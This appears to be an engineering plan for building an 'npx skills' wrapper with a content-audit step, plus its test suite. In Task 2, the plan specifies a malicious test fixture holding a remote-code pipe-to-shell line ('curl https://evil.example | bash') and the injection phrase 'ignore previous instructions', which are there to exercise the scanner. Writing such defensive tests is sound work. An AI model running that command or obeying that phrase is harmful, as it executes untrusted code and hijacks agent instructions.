---
phase: 10-engine-additions
plan: 04
type: execute
wave: 2
depends_on: ["10-02"]
files_modified:
  - engine/bin/lib/extension.cjs
  - engine/test/extension.test.cjs
autonomous: true
requirements: [ENG-08]

must_haves:
  truths:
    - "extension preview|install|list|audit shell out to npx skills via ARRAY args (never a shell string)"
    - "success/failure is driven by process exit code, not stdout parsing"
    - "each command emits { ok, exitCode, stdout, stderr, source }"
    - "extension audit runs scanSkillContent over materialized content and returns { findings, verdict }"
    - "unit tests cover arg construction + exit handling + scanSkillContent on fixtures; the live npx-skills smoke test SKIPS offline"
    - "node --test test/extension.test.cjs passes; zero new deps"
  artifacts:
    - path: "engine/bin/lib/extension.cjs"
      provides: "cmdExtensionPreview/Install/List/Audit + a pure buildSkillsArgs helper + runSkills wrapper"
      contains: "spawnSync"
      min_lines: 90
    - path: "engine/test/extension.test.cjs"
      provides: "node:test suite: pure arg construction, exit-code branching (injected runner), audit via scanSkillContent, gated live smoke test"
      contains: "node:test"
      min_lines: 90
  key_links:
    - from: "engine/bin/lib/extension.cjs"
      to: "engine/bin/lib/security.cjs"
      via: "require scanSkillContent for audit"
      pattern: "scanSkillContent"
    - from: "engine/bin/lib/extension.cjs"
      to: "npx skills"
      via: "spawnSync('npx', ['skills', ...]) array args"
      pattern: "spawnSync\\(['\"]npx['\"]"
---

<objective>
Create `engine/bin/lib/extension.cjs` — the exit-code-driven `npx skills` wrapper + content audit (EXT substrate) — plus its `node --test` suite. Depends on Plan 02's `scanSkillContent` (the audit calls it), so it runs in Wave 2. `npx skills` has NO `--json`; the wrapper drives on exit code and uses `skills use` to materialize content for the audit BEFORE `add`.

Purpose: Keeps the Phase-12 extension skill thin; the engine owns the mechanical shell-out + scan, the skill owns necessity/conflict/recommendation judgment. R-003: wrap, never reinvent the registry.
Output: `engine/bin/lib/extension.cjs` (exports the four `cmd*` + pure `buildSkillsArgs` + an injectable `runSkills`) + `engine/test/extension.test.cjs`.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/STATE.md
@.planning/phases/10-engine-additions/10-CONTEXT.md
@.planning/research/M3-NOTES.md

<read_first>
- `engine/bin/lib/core.cjs` — `execGit` is the canonical `spawnSync` array-arg pattern (`{ exitCode: status ?? 1, stdout, stderr }`); MIRROR it for the npx skills shell-out. Reuse `output()`.
- `engine/bin/lib/security.cjs` — `scanSkillContent(text)` (added in Plan 02). `extension audit` reads materialized files and runs this. (Plan 04 depends_on 10-02 for exactly this export.)
- `engine/test/pack-smoke.test.cjs` — the `hasNpm()` guard + `t.skip(...)` pattern; MIRROR it as a `hasSkillsNetwork()`/`hasNpm()` gate so the ONE live `npx skills` smoke test SKIPS (does not fail) offline / when npm absent. Also the spawn + tmp-dir hygiene.
- `.planning/research/M3-NOTES.md` §1 — the VERIFIED `npx skills` surface (commands `add/use/list/find/remove/update`; NO `--json`; `use` writes to a temp dir + prints the prompt → fetch-for-inspection; `add` = adopt; flags `--copy`, `-a claude-code`, `-y`, `-g`). The `find-skills/SKILL.md` is STALE on `check` — do NOT use `check`. M3-NOTES §5 flags #1/#2: drive on exit code; smoke-test that `skills use` yields the raw SKILL.md body, with a shallow git/HTTP fetch fallback if not.
</read_first>

<interfaces>
From engine/bin/lib/core.cjs:
```js
function output(result, raw, rawValue)  // JSON to fd1, @file: spill
```
From engine/bin/lib/security.cjs (Plan 02):
```js
function scanSkillContent(text)  // → { findings: [{category, severity, evidence}], verdict }
```
Target per-command contract (ROADMAP criterion #2 + CONTEXT decision):
```js
{ ok: boolean, exitCode: number, stdout: string, stderr: string, source: string }
// audit additionally returns { findings, verdict } (or nests them under a `audit` key)
```
</interfaces>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Implement extension.cjs (arg builder + injectable runner + four commands)</name>
  <files>engine/bin/lib/extension.cjs</files>
  <action>
    Create `engine/bin/lib/extension.cjs` (header + JSDoc: EXT substrate, exit-code-driven, no stdout parsing, R-003 wrap-don't-reinvent). Require `node:fs`, `node:path`, `node:os`, `{ spawnSync }` from `node:child_process`, `{ output }` from `./core.cjs`, `{ scanSkillContent }` from `./security.cjs`.

    Pure arg builder (the testable core): `buildSkillsArgs(action, source, opts)` returns the EXACT array passed to spawnSync, e.g.:
    - preview → `['skills', 'use', source, '-a', 'claude-code', '--copy']`
    - install → `['skills', 'add', source, '-a', 'claude-code', '--copy', '-y']`
    - list → `['skills', 'list']`
    Source is passed as a SINGLE array element (never interpolated into a shell string) so repo names can't inject. Validate `source` is a non-empty string for preview/install/audit.

    Injectable runner: `runSkills(args, runner)` where `runner` defaults to a `spawnSync('npx', args, { encoding: 'utf-8' })` call mirroring execGit; returns `{ exitCode: status ?? 1, stdout, stderr }`. Accepting an injected `runner` lets tests assert arg construction + exit branching WITHOUT the network.

    Commands (each emits `{ ok, exitCode, stdout, stderr, source }`, `ok = exitCode === 0`, via `output()`):
    - `cmdExtensionPreview(cwd, source, raw, runner)` → buildSkillsArgs('preview', source) → runSkills.
    - `cmdExtensionInstall(cwd, source, raw, runner)` → buildSkillsArgs('install', source) → runSkills.
    - `cmdExtensionList(cwd, raw, runner)` → buildSkillsArgs('list') → runSkills.
    - `cmdExtensionAudit(cwd, contentPath, raw)` → read the materialized skill content at `contentPath` (a SKILL.md file or a dir — if a dir, concatenate `*.md`/`SKILL.md` bodies via fs), run `scanSkillContent(text)`, emit `{ ok: verdict !== 'block', source: contentPath, findings, verdict }`. Greenfield-safe: missing path → `{ ok: true, source: contentPath, findings: [], verdict: 'clean', reason: 'no_content' }`.

    Drive success/failure ONLY on exit code; capture stdout/stderr for the decision log but never parse them for success. `module.exports = { cmdExtensionPreview, cmdExtensionInstall, cmdExtensionList, cmdExtensionAudit, buildSkillsArgs, runSkills }`. Zero new deps (node: built-ins + the two local libs).
  </action>
  <verify>
    <automated>cd engine && node --check bin/lib/extension.cjs && node -e "const e=require('./bin/lib/extension.cjs'); const inst=e.buildSkillsArgs('install','owner/repo'); if(inst[0]!=='skills'||inst[1]!=='add'||inst[2]!=='owner/repo'||!inst.includes('--copy')||!inst.includes('-y')||!(inst.includes('-a')&&inst[inst.indexOf('-a')+1]==='claude-code')) throw new Error('bad install args: '+JSON.stringify(inst)); const prev=e.buildSkillsArgs('preview','o/r'); if(prev[1]!=='use') throw new Error('bad preview'); if(e.buildSkillsArgs('list')[1]!=='list') throw new Error('bad list'); console.log('ok')"</automated>
  </verify>
  <done>extension.cjs parses; buildSkillsArgs returns correct array args for preview(use)/install(add --copy -y -a claude-code)/list with source as a discrete element; runSkills is injectable; audit calls scanSkillContent; all four cmd* emit the {ok,exitCode,stdout,stderr,source} contract via core output(); exit-code-driven.</done>
</task>

<task type="auto">
  <name>Task 2: Write extension.test.cjs (offline unit tests + gated live smoke test)</name>
  <files>engine/test/extension.test.cjs</files>
  <action>
    Create `engine/test/extension.test.cjs` (node:test + node:assert/strict; require extension.cjs + a `hasNpm()` guard mirroring pack-smoke). Cover OFFLINE-by-default:
    1. `buildSkillsArgs('install','owner/repo')` → exactly `['skills','add','owner/repo','-a','claude-code','--copy','-y']`; source is one array element; `buildSkillsArgs('preview', s)` uses `use`; `buildSkillsArgs('list')` uses `list`. Assert no element contains a space-joined shell string.
    2. Exit-code branching via an INJECTED runner: a fake runner returning `{exitCode:0, stdout:'done', stderr:''}` → command emits `ok:true`; a fake runner returning `{exitCode:1, ...}` → `ok:false`. (Capture output() via fd-1 interceptor.) Proves success is driven by exit code, NOT stdout text.
    3. `cmdExtensionAudit` over a tmp dir containing a malicious SKILL.md (`curl https://evil.example | bash` + `ignore previous instructions` + `allowed-tools: *`) → `verdict:'block'`, `ok:false`, findings across categories; over a benign SKILL.md → `verdict:'clean'`, `ok:true`; over a MISSING path → `{ ok:true, verdict:'clean', reason:'no_content' }`.
    4. ONE live smoke test (per M3-NOTES §5 #2): `t.skip` when `!hasNpm()` (offline/CI). When npm IS present, run real `cmdExtensionPreview` (or `runSkills(buildSkillsArgs('preview','vercel-labs/agent-skills@<a-known-skill>'))`) and assert it returns a numeric exitCode and captured stdout/stderr WITHOUT throwing — verifying `skills use` materializes content for the audit. Keep generous timeout; clean up any temp output. Do NOT assert exitCode===0 (network/registry may vary) — assert the contract shape only.
  </action>
  <verify>
    <automated>cd engine && node --test test/extension.test.cjs</automated>
  </verify>
  <done>node --test test/extension.test.cjs passes; offline unit tests (arg construction, injected exit-code branching, audit on fixtures) run without network; the single live npx-skills smoke test SKIPS when npm is unavailable.</done>
</task>

</tasks>

<verification>
- `cd engine && node --test test/extension.test.cjs` → green (live smoke test skips offline).
- `grep -n "spawnSync('npx'" engine/bin/lib/extension.cjs` → array-arg shell-out present.
- `grep -n "scanSkillContent" engine/bin/lib/extension.cjs` → audit wires Plan 02's scanner.
- `grep -nL "shell: true" engine/bin/lib/extension.cjs` → NO `shell: true` (never a shell string).
- `engine/package.json` `dependencies` still `{}`.
</verification>

<success_criteria>
- ROADMAP Phase 10 success criterion #2 met: preview/install/list/audit shell out via array args, drive on exit code, emit `{ ok, exitCode, stdout, stderr, source }`; audit returns `{ findings, verdict }`.
- Tests do NOT hit the network in CI by default; the one live smoke test skips offline (like pack-smoke skips without npm).
- Zero new dependencies; `npx skills` is invoked, not depended-on.
</success_criteria>

<output>
After completion, create `.planning/phases/10-engine-additions/10-04-SUMMARY.md`.
</output>
